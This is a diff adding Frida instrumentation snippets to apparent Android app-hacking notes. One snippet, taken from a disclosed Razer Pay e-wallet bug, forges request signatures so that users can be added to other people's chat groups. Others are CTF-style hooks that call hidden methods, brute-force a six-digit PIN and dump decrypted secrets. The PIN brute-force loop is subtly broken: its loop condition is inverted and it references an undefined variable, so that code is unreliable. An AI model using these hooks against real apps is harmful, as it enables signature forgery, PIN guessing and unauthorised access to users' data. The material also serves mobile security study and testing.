@@ -208,3 +208,81 @@ Process.findModuleByName("name.so").enumerateImports()	// look for juicy things 
 ## Frida Code Snippets
 
 <https://erev0s.com/blog/frida-code-snippets-for-android/>  
+
+---
+
+```javascript
+// https://blog.sambal0x.com/2020/04/30/Hacking-razer-pay-ewallet-app.html
+// frida.js - Use this for recalculating signature for adding user to other people's chatgroup
+
+console.log("Starting...")
+Java.perform(function () {
+    var MD5 = Java.use('com.mol.molwallet.view.MD5')
+    MD5.MD5Encode.implementation = function (arg)
+    {
+        console.log("Hooking class MD5 - method MD5Encode")
+
+       //Extra step - calculate new signature
+        var ret_value = this.MD5Encode("groupId=1x9&userIds=95xxx7&token=b6fxxxd3-2xxc-4xxf-bxx7-7fxxxxa6")
+        console.log("[+]  signature= " + ret_value)
+
+        //Call method with original arguments so app doesn't crash ..
+        var ret_value = this.MD5Encode(arg) //original value
+                console.log("original ARG: " + arg)  
+        return ret_value;
+    }
+})
+```
+
+Trigger a method:  
+
+```javascript
+Java.perform(function() {
+        var webint = Java.use("com.hacker101.oauth.WebAppInterface");
+        var flag = webint.$new(null).getFlagPath();
+        console.log("Flag: " + flag);
+        
+});
+```
+
+Create a loop:  
+
+```javascript
+Java.perform(function() {
+        var onComplete = Java.use("com.hackerone.mobile.challenge2.MainActivity$1");
+        onComplete.onComplete.implementation = function(arg1) {
+                console.log("ARG1: " + arg1);
+
+                for (var i = 1; i > 999999; i++) {
+                        var currentPin = String(i).padStart(6, '0');
+                        var retval = this.onComplete(currentPin);
+                        if (success) {
+                                console.log("The correct pin is: " + currentPin);
+                                return retval;
+                        }
+                }
+                console.log("Done");
+        }
+});
+```
+
+Hook a method and execute normally but save results:  
+
+```javascript
+Java.perform(function() {
+        var success = false;
+        var sb = Java.use("org.libsodium.jni.crypto.SecretBox");
+        sb.decrypt.implementation = function(ba1, ba2) {
+                var ret = "";
+                try {
+                        ret = this.decrypt(ba1, ba2);
+                        success = true;
+                        console.log("Found the flag: " + Java.use('java.lang.String').$new(ret));
+                } catch (ex) {
+                        success = false;
+                        ret = Java.array('byte', []);
+                }
+                return ret;
+        }
+});
+```
